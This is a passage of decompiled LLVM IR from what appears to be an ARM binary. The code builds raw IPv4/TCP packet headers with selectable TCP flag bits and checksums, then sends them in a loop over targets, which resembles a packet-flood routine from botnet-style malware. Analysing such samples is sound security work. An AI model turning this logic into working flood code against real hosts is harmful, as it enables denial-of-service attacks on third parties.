  %v0_bc64 = load i32, i32* %lr.global-to-local, align 4
  %v2_bc64 = icmp eq i32 %v0_bc64, 0
  store i1 %v2_bc64, i1* %cpsr_z.global-to-local, align 1
  %v0_bc68 = load i32, i32* %r2.global-to-local, align 4
  %v3_bc68 = sdiv i32 %v0_bc68, 256
  store i32 %v3_bc68, i32* %r3.global-to-local, align 4
  store i32 %v4_bc6c, i32* %r2.global-to-local, align 4
  %v1_bc70 = trunc i32 %v3_bc68 to i8
  %v2_bc70 = load i32, i32* @r4, align 4
  %v3_bc70 = add i32 %v2_bc70, 3
  %v4_bc70 = inttoptr i32 %v3_bc70 to i8*
  store i8 %v1_bc70, i8* %v4_bc70, align 1
  %v0_bc74 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bc74, label %bb77, label %bb76

bb76:                                             ; preds = %dec_label_pc_bb78
  store i32 64, i32* %r3.global-to-local, align 4
  br label %bb77

bb77:                                             ; preds = %dec_label_pc_bb78, %bb76
  %v0_bc78 = load i32, i32* %r2.global-to-local, align 4
  %v1_bc78 = trunc i32 %v0_bc78 to i8
  %v2_bc78 = load i32, i32* @r4, align 4
  %v3_bc78 = add i32 %v2_bc78, 8
  %v4_bc78 = inttoptr i32 %v3_bc78 to i8*
  store i8 %v1_bc78, i8* %v4_bc78, align 1
  %v0_bc7c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bc7c, label %.thread6, label %bb78

bb78:                                             ; preds = %bb77
  %v1_bc7c = load i32, i32* %r3.global-to-local, align 4
  %v2_bc7c = trunc i32 %v1_bc7c to i8
  %v3_bc7c = load i32, i32* @r4, align 4
  %v4_bc7c = add i32 %v3_bc7c, 6
  %v5_bc7c = inttoptr i32 %v4_bc7c to i8*
  store i8 %v2_bc7c, i8* %v5_bc7c, align 1
  %v0_bc80.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bc80.pr, label %.thread6, label %bb79

bb79:                                             ; preds = %bb78
  store i32 0, i32* %r2.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb77, %bb78, %bb79
  store i32 6, i32* %r3.global-to-local, align 4
  %v2_bc88 = load i32, i32* @r4, align 4
  %v3_bc88 = add i32 %v2_bc88, 9
  %v4_bc88 = inttoptr i32 %v3_bc88 to i8*
  store i8 6, i8* %v4_bc88, align 1
  %v0_bc8c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_bc8c, label %bb81, label %bb80

bb80:                                             ; preds = %.thread6
  %v1_bc8c = load i32, i32* %r2.global-to-local, align 4
  %v2_bc8c = trunc i32 %v1_bc8c to i8
  %v3_bc8c = load i32, i32* @r4, align 4
  %v4_bc8c = add i32 %v3_bc8c, 7
  %v5_bc8c = inttoptr i32 %v4_bc8c to i8*
  store i8 %v2_bc8c, i8* %v5_bc8c, align 1
  br label %bb81

bb81:                                             ; preds = %.thread6, %bb80
  %v2_bc94 = load i32, i32* @global_var_1ec7c.86, align 4
  store i32 %v2_bc94, i32* %r3.global-to-local, align 4
  %v0_bc98 = load i32, i32* %r0.global-to-local, align 4
  %v3_bc98 = sdiv i32 %v0_bc98, 256
  store i32 %v3_bc98, i32* %ip.global-to-local, align 4
  %v1_bc9c = load i32, i32* @r4, align 4
  %v2_bc9c = add i32 %v1_bc9c, 12
  %v3_bc9c = inttoptr i32 %v2_bc9c to i32*
  store i32 %v2_bc94, i32* %v3_bc9c, align 4
  %v0_bca0 = load i32, i32* %ip.global-to-local, align 4
  %v1_bca0 = trunc i32 %v0_bca0 to i8
  %v2_bca0 = load i32, i32* @r4, align 4
  %v3_bca0 = add i32 %v2_bca0, 5
  %v4_bca0 = inttoptr i32 %v3_bca0 to i8*
  store i8 %v1_bca0, i8* %v4_bca0, align 1
  %v3_bca4 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bca4, i32* %r2.global-to-local, align 4
  store i32 %v2_b748, i32* %ip.global-to-local, align 4
  %v4_bcac = mul i32 %v3_bca4, 16
  %v5_bcac = add i32 %v4_bcac, %v2_b748
  %v6_bcac = inttoptr i32 %v5_bcac to i32*
  %v7_bcac = load i32, i32* %v6_bcac, align 4
  store i32 %v7_bcac, i32* %r3.global-to-local, align 4
  %v0_bcb0 = load i32, i32* %r0.global-to-local, align 4
  %v1_bcb0 = trunc i32 %v0_bcb0 to i8
  %v2_bcb0 = load i32, i32* @r4, align 4
  %v3_bcb0 = add i32 %v2_bcb0, 4
  %v4_bcb0 = inttoptr i32 %v3_bcb0 to i8*
  store i8 %v1_bcb0, i8* %v4_bcb0, align 1
  %v0_bcb4 = load i32, i32* %r3.global-to-local, align 4
  %v1_bcb4 = load i32, i32* @r4, align 4
  %v2_bcb4 = add i32 %v1_bcb4, 16
  %v3_bcb4 = inttoptr i32 %v2_bcb4 to i32*
  store i32 %v0_bcb4, i32* %v3_bcb4, align 4
  %v0_bcb8 = load i32, i32* %r2.global-to-local, align 4
  %v3_bcb8 = mul i32 %v0_bcb8, 16
  %v1_bcbc = load i32, i32* %ip.global-to-local, align 4
  %v2_bcbc = add i32 %v1_bcbc, %v3_bcb8
  store i32 %v2_bcbc, i32* %r2.global-to-local, align 4
  %v1_bcc0 = add i32 %v2_bcbc, 13
  %v2_bcc0 = inttoptr i32 %v1_bcc0 to i8*
  %v3_bcc0 = load i8, i8* %v2_bcc0, align 1
  %v4_bcc0 = zext i8 %v3_bcc0 to i32
  store i32 %v4_bcc0, i32* %r1.global-to-local, align 4
  %v1_bcc4 = add i32 %v2_bcbc, 12
  %v2_bcc4 = inttoptr i32 %v1_bcc4 to i8*
  %v3_bcc4 = load i8, i8* %v2_bcc4, align 1
  %v4_bcc4 = zext i8 %v3_bcc4 to i32
  %v4_bcc8 = mul nuw nsw i32 %v4_bcc0, 256
  %v5_bcc8 = or i32 %v4_bcc4, %v4_bcc8
  store i32 %v5_bcc8, i32* %r3.global-to-local, align 4
  %v2_bccc = load i32, i32* @r4, align 4
  %v3_bccc = add i32 %v2_bccc, 20
  %v4_bccc = inttoptr i32 %v3_bccc to i8*
  store i8 %v3_bcc4, i8* %v4_bccc, align 1
  %v0_bcd0 = load i32, i32* @r4, align 4
  %v1_bcd0 = add i32 %v0_bcd0, 20
  store i32 %v1_bcd0, i32* @r6, align 4
  %v0_bcd4 = load i32, i32* %r3.global-to-local, align 4
  %v3_bcd4 = sdiv i32 %v0_bcd4, 256
  store i32 %v3_bcd4, i32* %r3.global-to-local, align 4
  %v1_bcd8 = trunc i32 %v3_bcd4 to i8
  %v3_bcd8 = add i32 %v0_bcd0, 21
  %v4_bcd8 = inttoptr i32 %v3_bcd8 to i8*
  store i8 %v1_bcd8, i8* %v4_bcd8, align 1
  %v0_bcdc = load i32, i32* @r6, align 4
  %v1_bcdc = add i32 %v0_bcdc, 13
  %v2_bcdc = inttoptr i32 %v1_bcdc to i8*
  %v3_bcdc = load i8, i8* %v2_bcdc, align 1
  %v4_bcdc = zext i8 %v3_bcdc to i32
  store i32 %v4_bcdc, i32* %r3.global-to-local, align 4
  %v0_bce0 = load i32, i32* %r2.global-to-local, align 4
  %v1_bce0 = add i32 %v0_bce0, 8
  %v2_bce0 = inttoptr i32 %v1_bce0 to i32*
  %v3_bce0 = load i32, i32* %v2_bce0, align 4
  store i32 %v3_bce0, i32* %r1.global-to-local, align 4
  %v1_bce4 = or i32 %v4_bcdc, 1
  store i32 %v1_bce4, i32* %r3.global-to-local, align 4
  %v1_bce8 = add i32 %v0_bce0, 15
  %v2_bce8 = inttoptr i32 %v1_bce8 to i8*
  %v3_bce8 = load i8, i8* %v2_bce8, align 1
  %v4_bce8 = zext i8 %v3_bce8 to i32
  store i32 %v4_bce8, i32* %ip.global-to-local, align 4
  %v1_bcec = add i32 %v0_bce0, 14
  %v2_bcec = inttoptr i32 %v1_bcec to i8*
  %v3_bcec = load i8, i8* %v2_bcec, align 1
  %v4_bcec = zext i8 %v3_bcec to i32
  store i32 %v4_bcec, i32* %r0.global-to-local, align 4
  %v2_bcf0 = add i32 %v0_bcdc, 4
  %v3_bcf0 = inttoptr i32 %v2_bcf0 to i32*
  store i32 %v3_bce0, i32* %v3_bcf0, align 4
  %v0_bcf4 = load i32, i32* %r2.global-to-local, align 4
  %v1_bcf4 = add i32 %v0_bcf4, 4
  %v2_bcf4 = inttoptr i32 %v1_bcf4 to i32*
  %v3_bcf4 = load i32, i32* %v2_bcf4, align 4
  store i32 %v3_bcf4, i32* %lr.global-to-local, align 4
  %v0_bcf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_bcf8 = trunc i32 %v0_bcf8 to i8
  %v2_bcf8 = load i32, i32* @r6, align 4
  %v3_bcf8 = add i32 %v2_bcf8, 13
  %v4_bcf8 = inttoptr i32 %v3_bcf8 to i8*
  store i8 %v1_bcf8, i8* %v4_bcf8, align 1
  %v0_bcfc = load i32, i32* @r6, align 4
  %v1_bcfc = add i32 %v0_bcfc, 12
  %v2_bcfc = inttoptr i32 %v1_bcfc to i8*
  %v3_bcfc = load i8, i8* %v2_bcfc, align 1
  %v4_bcfc = zext i8 %v3_bcfc to i32
  store i32 %v4_bcfc, i32* %r2.global-to-local, align 4
  %v1_bd00 = add i32 %v0_bcfc, 13
  %v2_bd00 = inttoptr i32 %v1_bd00 to i8*
  %v3_bd00 = load i8, i8* %v2_bd00, align 1
  %v4_bd00 = zext i8 %v3_bd00 to i32
  %v0_bd04 = load i32, i32* %r0.global-to-local, align 4
  %v1_bd04 = load i32, i32* %ip.global-to-local, align 4
  %v4_bd04 = mul i32 %v1_bd04, 256
  %v5_bd04 = or i32 %v4_bd04, %v0_bd04
  store i32 %v5_bd04, i32* %r0.global-to-local, align 4
  %tmp101 = urem i8 %v3_bcfc, 16
  %v1_bd08 = zext i8 %tmp101 to i32
  %v3_bd0c = sdiv i32 %v5_bd04, 256
  store i32 %v3_bd0c, i32* %r1.global-to-local, align 4
  %v1_bd10 = or i32 %v1_bd08, 128
  store i32 %v1_bd10, i32* %r2.global-to-local, align 4
  %v1_bd14 = or i32 %v4_bd00, 16
  store i32 %v1_bd14, i32* %r3.global-to-local, align 4
  %v1_bd18 = trunc i32 %v3_bd0c to i8
  %v3_bd18 = add i32 %v0_bcfc, 3
  %v4_bd18 = inttoptr i32 %v3_bd18 to i8*
  store i8 %v1_bd18, i8* %v4_bd18, align 1
  %v0_bd1c = load i32, i32* %lr.global-to-local, align 4
  %v1_bd1c = load i32, i32* @r6, align 4
  %v2_bd1c = add i32 %v1_bd1c, 8
  %v3_bd1c = inttoptr i32 %v2_bd1c to i32*
  store i32 %v0_bd1c, i32* %v3_bd1c, align 4
  %v0_bd20 = load i32, i32* %r2.global-to-local, align 4
  %v1_bd20 = trunc i32 %v0_bd20 to i8
  %v2_bd20 = load i32, i32* @r6, align 4
  %v3_bd20 = add i32 %v2_bd20, 12
  %v4_bd20 = inttoptr i32 %v3_bd20 to i8*
  store i8 %v1_bd20, i8* %v4_bd20, align 1
  %v0_bd24 = load i32, i32* %r3.global-to-local, align 4
  %v1_bd24 = trunc i32 %v0_bd24 to i8
  %v2_bd24 = load i32, i32* @r6, align 4
  %v3_bd24 = add i32 %v2_bd24, 13
  %v4_bd24 = inttoptr i32 %v3_bd24 to i8*
  store i8 %v1_bd24, i8* %v4_bd24, align 1
  %v0_bd28 = load i32, i32* %r0.global-to-local, align 4
  %v1_bd28 = trunc i32 %v0_bd28 to i8
  %v2_bd28 = load i32, i32* @r6, align 4
  %v3_bd28 = add i32 %v2_bd28, 2
  %v4_bd28 = inttoptr i32 %v3_bd28 to i8*
  store i8 %v1_bd28, i8* %v4_bd28, align 1
  %v0_bd2c = call i32 @function_fe60()
  %v1_bd2c = trunc i32 %v0_bd2c to i8
  store i32 %v0_bd2c, i32* %r0.global-to-local, align 4
  store i32 %v1_b810, i32* %lr.global-to-local, align 4
  %v0_bd34 = load i32, i32* @r6, align 4
  %v1_bd34 = add i32 %v0_bd34, 13
  %v2_bd34 = inttoptr i32 %v1_bd34 to i8*
  %v3_bd34 = load i8, i8* %v2_bd34, align 1
  %v4_bd34 = zext i8 %v3_bd34 to i32
  store i32 %v1_bd38, i32* %r2.global-to-local, align 4
  %v1_bd3c = and i32 %v4_bd34, 223
  %v5_bd40 = or i32 %v1_bd3c, %v4_bd40
  store i32 %v5_bd40, i32* %r3.global-to-local, align 4
  %v1_bd44 = trunc i32 %v5_bd40 to i8
  store i8 %v1_bd44, i8* %v2_bd34, align 1
  store i32 %v1_b830, i32* %r1.global-to-local, align 4
  %v0_bd4c = load i32, i32* @r6, align 4
  %v1_bd4c = add i32 %v0_bd4c, 13
  %v2_bd4c = inttoptr i32 %v1_bd4c to i8*
  %v3_bd4c = load i8, i8* %v2_bd4c, align 1
  %v4_bd4c = zext i8 %v3_bd4c to i32
  store i32 %v1_bd50, i32* %r3.global-to-local, align 4
  %v1_bd54 = and i32 %v4_bd4c, 239
  %v5_bd58 = or i32 %v1_bd54, %v4_bd58
  store i32 %v5_bd58, i32* %r2.global-to-local, align 4
  %v1_bd5c = trunc i32 %v5_bd58 to i8
  store i8 %v1_bd5c, i8* %v2_bd4c, align 1
  store i32 %v1_b850, i32* %ip.global-to-local, align 4
  %v0_bd64 = load i32, i32* @r6, align 4
  %v1_bd64 = add i32 %v0_bd64, 13
  %v2_bd64 = inttoptr i32 %v1_bd64 to i8*
  %v3_bd64 = load i8, i8* %v2_bd64, align 1
  %v4_bd64 = zext i8 %v3_bd64 to i32
  store i32 %v1_bd68, i32* %r2.global-to-local, align 4
  %v1_bd6c = and i32 %v4_bd64, 247
  %v5_bd70 = or i32 %v1_bd6c, %v4_bd70
  store i32 %v5_bd70, i32* %r3.global-to-local, align 4
  %v1_bd74 = trunc i32 %v5_bd70 to i8
  store i8 %v1_bd74, i8* %v2_bd64, align 1
  %v0_bd7c = load i32, i32* @r6, align 4
  %v1_bd7c = add i32 %v0_bd7c, 13
  %v2_bd7c = inttoptr i32 %v1_bd7c to i8*
  %v3_bd7c = load i8, i8* %v2_bd7c, align 1
  %v4_bd7c = zext i8 %v3_bd7c to i32
  store i32 %v1_bd80, i32* %r3.global-to-local, align 4
  %v1_bd84 = and i32 %v4_bd7c, 251
  %v5_bd88 = or i32 %v1_bd84, %v4_bd88
  store i32 %v5_bd88, i32* %r2.global-to-local, align 4
  %v1_bd8c = trunc i32 %v5_bd88 to i8
  store i8 %v1_bd8c, i8* %v2_bd7c, align 1
  store i32 %v1_b890, i32* %r1.global-to-local, align 4
  %v0_bd94 = load i32, i32* @r6, align 4
  %v1_bd94 = add i32 %v0_bd94, 13
  %v2_bd94 = inttoptr i32 %v1_bd94 to i8*
  %v3_bd94 = load i8, i8* %v2_bd94, align 1
  %v4_bd94 = zext i8 %v3_bd94 to i32
  store i32 %v1_bd98, i32* %r2.global-to-local, align 4
  %v1_bd9c = and i32 %v4_bd94, 253
  %v4_bda0 = or i32 %v1_bd9c, %v3_bda0
  store i32 %v4_bda0, i32* %r3.global-to-local, align 4
  %v1_bda4 = trunc i32 %v4_bda0 to i8
  store i8 %v1_bda4, i8* %v2_bd94, align 1
  %v0_bda8 = load i32, i32* @r6, align 4
  %v1_bda8 = add i32 %v0_bda8, 13
  %v2_bda8 = inttoptr i32 %v1_bda8 to i8*
  %v3_bda8 = load i8, i8* %v2_bda8, align 1
  %v4_bda8 = zext i8 %v3_bda8 to i32
  %v0_bdac = load i32, i32* @r8, align 4
  %v1_bdac = urem i32 %v0_bdac, 2
  %v1_bdb0 = and i32 %v4_bda8, 254
  store i32 %v1_bdb0, i32* %r2.global-to-local, align 4
  %v4_bdb427 = udiv i32 %v0_bd2c, 256
  %v2_bdb8 = or i32 %v1_bdb0, %v1_bdac
  store i32 %v2_bdb8, i32* %r3.global-to-local, align 4
  %v1_bdbc = trunc i32 %v4_bdb427 to i8
  %v3_bdbc = add i32 %v0_bda8, 15
  %v4_bdbc = inttoptr i32 %v3_bdbc to i8*
  store i8 %v1_bdbc, i8* %v4_bdbc, align 1
  %v3_bdc0 = load i32, i32* @r6, align 4
  %v4_bdc0 = add i32 %v3_bdc0, 14
  %v5_bdc0 = inttoptr i32 %v4_bdc0 to i8*
  store i8 %v1_bd2c, i8* %v5_bdc0, align 1
  %v0_bdc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_bdc4 = trunc i32 %v0_bdc4 to i8
  %v2_bdc4 = load i32, i32* @r6, align 4
  %v3_bdc4 = add i32 %v2_bdc4, 13
  %v4_bdc4 = inttoptr i32 %v3_bdc4 to i8*
  store i8 %v1_bdc4, i8* %v4_bdc4, align 1
  %v0_bdc8 = load i32, i32* @r4, align 4
  %v1_bdc8 = add i32 %v0_bdc8, 40
  store i32 %v1_bdc8, i32* %r0.global-to-local, align 4
  %v0_bdcc = load i32, i32* @sb, align 4
  store i32 %v0_bdcc, i32* @r1, align 4
  %v1_bdd0 = inttoptr i32 %v1_bdc8 to i8*
  %v2_bdd0 = call i32 @function_1003c(i8* %v1_bdd0)
  store i32 %v2_bdd0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_bdd4

dec_label_pc_bdd4:                                ; preds = %dec_label_pc_b974, %bb81
  %v3_bdd4 = load i32, i32* %stack_var_-40, align 4
  %v1_bdd8 = add i32 %v3_bdd4, 1
  store i32 %v1_bdd8, i32* %r3.global-to-local, align 4
  %v1_bddc = load i32, i32* @fp, align 4
  %v9_bddc = icmp eq i32 %v1_bdd8, %v1_bddc
  store i1 %v9_bddc, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bdd8, i32* %stack_var_-40, align 4
  %v5_bde4 = icmp slt i32 %v1_bdd8, %v1_bddc
  br i1 %v5_bde4, label %dec_label_pc_b964, label %dec_label_pc_bde8

dec_label_pc_bde8:                                ; preds = %dec_label_pc_bdd4, %.thread18
  %v0_bdf012 = phi i32 [ %v0_b938, %.thread18 ], [ %v1_bddc, %dec_label_pc_bdd4 ]
  %v0_bde8 = load i32, i32* @sb, align 4
  %v1_bde8 = add i32 %v0_bde8, 40
  store i32 %v1_bde8, i32* @sl, align 4
  %v1_bdec = add i32 %v0_bde8, 20
  store i32 %v1_bdec, i32* @r7, align 4
  %v2_be3c = icmp eq i32 %v1_b8e8, 0
  %v6_be1c = inttoptr i32 %v2_b758 to i32*
  %v3_be24 = icmp eq i32 %v3_b940, 65535
  br label %dec_label_pc_bdf0

dec_label_pc_bdf0:                                ; preds = %dec_label_pc_be4c, %dec_label_pc_bde8
  %v0_bdf0 = phi i32 [ %v1_bf2c, %dec_label_pc_be4c ], [ %v0_bdf012, %dec_label_pc_bde8 ]
  %v2_bdf0 = icmp eq i32 %v0_bdf0, 0
  store i1 %v2_bdf0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  %tmp82 = icmp slt i32 %v0_bdf0, 1
  br label %dec_label_pc_bdf8

dec_label_pc_bdf8:                                ; preds = %dec_label_pc_bdf8, %dec_label_pc_bdf0
  br i1 %tmp82, label %dec_label_pc_bdf8, label %dec_label_pc_bdfc

dec_label_pc_bdfc:                                ; preds = %dec_label_pc_bdf8
  %v0_bdfc = load i32, i32* @r7, align 4
  %tmp83 = mul i32 %v0_bdfc, 256
  %v1_be04 = and i32 %tmp83, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  %tmp84 = udiv i32 %v0_bdfc, 256
  %v4_be08 = urem i32 %tmp84, 256
  %v5_be08 = or i32 %v4_be08, %v1_be04
  store i32 %v5_be08, i32* @r8, align 4
  store i32 %v2_b758, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_b940, i32* %ip.global-to-local, align 4
  %v7_be1c = load i32, i32* %v6_be1c, align 4
  store i32 %v7_be1c, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_be24, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-40, align 4
  store i32 0, i32* @r6, align 4
  %v1_be30 = add i32 %v7_be1c, 20
  store i32 %v1_be30, i32* @r5, align 4
  br i1 %v3_be24, label %dec_label_pc_bf58, label %dec_label_pc_be38

dec_label_pc_be38:                                ; preds = %dec_label_pc_bf38, %dec_label_pc_bdfc
  %v0_be40 = phi i32 [ %v7_bf44, %dec_label_pc_bf38 ], [ %v7_be1c, %dec_label_pc_bdfc ]
  store i32 %v1_b8e8, i32* %lr.global-to-local, align 4
  store i1 %v2_be3c, i1* %cpsr_z.global-to-local, align 1
  %v1_be40 = add i32 %v0_be40, 40
  store i32 %v1_be40, i32* %r0.global-to-local, align 4
  %v0_be44 = load i32, i32* @sb, align 4
  store i32 %v0_be44, i32* @r1, align 4
  br i1 %v2_be3c, label %dec_label_pc_be4c, label %dec_label_pc_bf7c

dec_label_pc_be4c:                                ; preds = %dec_label_pc_be38, %dec_label_pc_bf58, %dec_label_pc_bf7c
  %v2_be4c = phi i32 [ %v0_be40, %dec_label_pc_be38 ], [ %v0_bf70, %dec_label_pc_bf58 ], [ %v2_be4c.pre, %dec_label_pc_bf7c ]
  %v0_be4c = load i32, i32* @r6, align 4
  %v1_be4c = trunc i32 %v0_be4c to i8
  %v3_be4c = add i32 %v2_be4c, 10
  %v4_be4c = inttoptr i32 %v3_be4c to i8*
  store i8 %v1_be4c, i8* %v4_be4c, align 1
  %v0_be50 = load i32, i32* @r6, align 4
  %v1_be50 = trunc i32 %v0_be50 to i8
  %v2_be50 = load i32, i32* @r4, align 4
  %v3_be50 = add i32 %v2_be50, 11
  %v4_be50 = inttoptr i32 %v3_be50 to i8*
  store i8 %v1_be50, i8* %v4_be50, align 1
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_be58 = load i32, i32* @r4, align 4
  store i32 %v0_be58, i32* @r0, align 4
  %v2_be5c = call i32 @function_e424(i32 %v0_be58, i32 20)
  %v3_be5c = trunc i32 %v2_be5c to i8
  store i32 %v2_be5c, i32* %r0.global-to-local, align 4
  %v3_be60 = load i32, i32* %stack_var_-40, align 4
  store i32 %v2_b748, i32* %r2.global-to-local, align 4
  %v3_be68 = mul i32 %v3_be60, 16
  %v2_be6c = add i32 %v3_be68, %v2_b748
  store i32 %v2_be6c, i32* %r1.global-to-local, align 4
  %v1_be70 = add i32 %v2_be6c, 4
  %v2_be70 = inttoptr i32 %v1_be70 to i32*
  %v3_be70 = load i32, i32* %v2_be70, align 4
  %v3_be74 = mul i32 %v3_be70, 65536
  store i32 %v3_be74, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_be70, 256
  %v1_be7c = and i32 %tmp85, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  %tmp86 = udiv i32 %v3_be70, 256
  %v4_be80 = urem i32 %tmp86, 256
  %v5_be80 = or i32 %v4_be80, %v1_be7c
  store i32 %v5_be80, i32* %r2.global-to-local, align 4
  %v1_be84 = add i32 %v3_be70, 1
  store i32 %v1_be84, i32* %r3.global-to-local, align 4
  store i32 %v1_be84, i32* %v2_be70, align 4
  %v0_be8c = load i32, i32* %r2.global-to-local, align 4
  %v1_be8c = load i32, i32* @r5, align 4
  %v2_be8c = add i32 %v1_be8c, 4
  %v3_be8c = inttoptr i32 %v2_be8c to i32*
  store i32 %v0_be8c, i32* %v3_be8c, align 4
  %v0_be90 = load i32, i32* %r1.global-to-local, align 4
  %v1_be90 = add i32 %v0_be90, 8
  %v2_be90 = inttoptr i32 %v1_be90 to i32*
  %v3_be90 = load i32, i32* %v2_be90, align 4
  %tmp87 = mul i32 %v3_be90, 256
  %v1_be9c = and i32 %tmp87, and (i32 ptrtoint (i32* @global_var_ff00.24 to i32), i32 16776960)
  %tmp88 = udiv i32 %v3_be90, 256
  %v4_bea0 = urem i32 %tmp88, 256
  %v5_bea0 = or i32 %v4_bea0, %v1_be9c
  store i32 %v5_bea0, i32* %r2.global-to-local, align 4
  %v4_bea428 = udiv i32 %v2_be5c, 256
  %v1_bea8 = trunc i32 %v4_bea428 to i8
  %v2_bea8 = load i32, i32* @r4, align 4
  %v3_bea8 = add i32 %v2_bea8, 11
  %v4_bea8 = inttoptr i32 %v3_bea8 to i8*
  store i8 %v1_bea8, i8* %v4_bea8, align 1
  %v3_beac = load i32, i32* @r4, align 4
  %v4_beac = add i32 %v3_beac, 10
  %v5_beac = inttoptr i32 %v4_beac to i8*
  store i8 %v3_be5c, i8* %v5_beac, align 1
  %v0_beb0 = load i32, i32* %r2.global-to-local, align 4
  %v1_beb0 = load i32, i32* @r5, align 4
  %v2_beb0 = add i32 %v1_beb0, 8
  %v3_beb0 = inttoptr i32 %v2_beb0 to i32*
  store i32 %v0_beb0, i32* %v3_beb0, align 4
  %v0_beb4 = load i32, i32* @r5, align 4
  store i32 %v0_beb4, i32* @r1, align 4
  %v0_beb8 = load i32, i32* @r8, align 4
  store i32 %v0_beb8, i32* %r2.global-to-local, align 4
  %v0_bebc = load i32, i32* @r7, align 4
  store i32 %v0_bebc, i32* %r3.global-to-local, align 4
  %v0_bec0 = load i32, i32* @r4, align 4
  store i32 %v0_bec0, i32* %r0.global-to-local, align 4
  %v0_bec4 = load i32, i32* @r6, align 4
  %v1_bec4 = trunc i32 %v0_bec4 to i8
  %v3_bec4 = add i32 %v0_beb4, 16
  %v4_bec4 = inttoptr i32 %v3_bec4 to i8*
  store i8 %v1_bec4, i8* %v4_bec4, align 1
  %v0_bec8 = load i32, i32* @r6, align 4
  %v1_bec8 = trunc i32 %v0_bec8 to i8
  %v2_bec8 = load i32, i32* @r5, align 4
  %v3_bec8 = add i32 %v2_bec8, 17
  %v4_bec8 = inttoptr i32 %v3_bec8 to i8*
  store i8 %v1_bec8, i8* %v4_bec8, align 1
  %v4_becc = call i32 @function_e480(i32 %v0_bec0, i32 %v0_beb4, i32 %v0_beb8, i32 %v0_bebc)
  %v5_becc = trunc i32 %v4_becc to i8
  store i32 %v4_becc, i32* %r0.global-to-local, align 4
  %v4_bed029 = udiv i32 %v4_becc, 256
  %v1_bed4 = trunc i32 %v4_bed029 to i8
  %v2_bed4 = load i32, i32* @r5, align 4
  %v3_bed4 = add i32 %v2_bed4, 17
  %v4_bed4 = inttoptr i32 %v3_bed4 to i8*
  store i8 %v1_bed4, i8* %v4_bed4, align 1
  %v3_bed8 = load i32, i32* @r5, align 4
  %v4_bed8 = add i32 %v3_bed8, 16
  %v5_bed8 = inttoptr i32 %v4_bed8 to i8*
  store i8 %v5_becc, i8* %v5_bed8, align 1
  %v3_bedc = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bedc, i32* %r3.global-to-local, align 4
  %v0_bee0 = load i32, i32* @r4, align 4
  %v1_bee0 = add i32 %v0_bee0, 20
  %v2_bee0 = inttoptr i32 %v1_bee0 to i32*
  %v3_bee0 = load i32, i32* %v2_bee0, align 4
  %v5_bee8 = mul i32 %v3_bedc, 24
  %v3_bef0 = udiv i32 %v3_bee0, 65536
  store i32 %v3_bef0, i32* %r2.global-to-local, align 4
  %v2_bef4 = add i32 %v5_bee8, %arg2
  store i32 %v2_bef4, i32* %ip.global-to-local, align 4
  %v3_bef84 = udiv i32 %v3_bee0, 16777216
  %v1_befc = trunc i32 %v3_bef84 to i8
  %v3_befc = add i32 %v2_bef4, 3
  %v4_befc = inttoptr i32 %v3_befc to i8*
  store i8 %v1_befc, i8* %v4_befc, align 1
  %v0_bf00 = load i32, i32* %r2.global-to-local, align 4
  %v1_bf00 = trunc i32 %v0_bf00 to i8
  %v2_bf00 = load i32, i32* %ip.global-to-local, align 4
  %v3_bf00 = add i32 %v2_bf00, 2
  %v4_bf00 = inttoptr i32 %v3_bf00 to i8*
  store i8 %v1_bf00, i8* %v4_bf00, align 1
  %v0_bf04 = load i32, i32* @r4, align 4
  store i32 %v0_bf04, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 %v3_b8f8, i32* %r0.global-to-local, align 4
  %v0_bf10 = load i32, i32* @sl, align 4
  store i32 %v0_bf10, i32* %r2.global-to-local, align 4
  store i32 16, i32* @r4, align 4
  %v0_bf18 = load i32, i32* %ip.global-to-local, align 4
  %v6_bf20 = inttoptr i32 %v0_bf04 to i32*
  %v7_bf20 = call i32 @function_13eec(i32 %v3_b8f8, i32* %v6_bf20, i32 %v0_bf10, i32 16384, i32 %v0_bf18, i32 16)
  %v3_bf24 = load i32, i32* %stack_var_-40, align 4
  store i32 %v3_bf24, i32* %r3.global-to-local, align 4
  %v1_bf28 = add i32 %v3_bf24, 1
  store i32 %v1_bf28, i32* %r0.global-to-local, align 4
  %v1_bf2c = load i32, i32* @fp, align 4
  %v9_bf2c = icmp eq i32 %v1_bf28, %v1_bf2c
  store i1 %v9_bf2c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_bf28, i32* %stack_var_-40, align 4
  %v6_bf34 = icmp slt i32 %v1_bf28, %v1_bf2c
  br i1 %v6_bf34, label %dec_label_pc_bf38, label %dec_label_pc_bdf0

dec_label_pc_bf38:                                ; preds = %dec_label_pc_be4c
  store i32 %v2_b758, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  store i32 %v3_b940, i32* %ip.global-to-local, align 4
  %v4_bf44 = mul i32 %v1_bf28, 4
  %v5_bf44 = add i32 %v4_bf44, %v2_b758
  %v6_bf44 = inttoptr i32 %v5_bf44 to i32*
  %v7_bf44 = load i32, i32* %v6_bf44, align 4
  store i32 %v7_bf44, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i1 %v3_be24, i1* %cpsr_z.global-to-local, align 1
  %v1_bf50 = add i32 %v7_bf44, 20
  store i32 %v1_bf50, i32* @r5, align 4
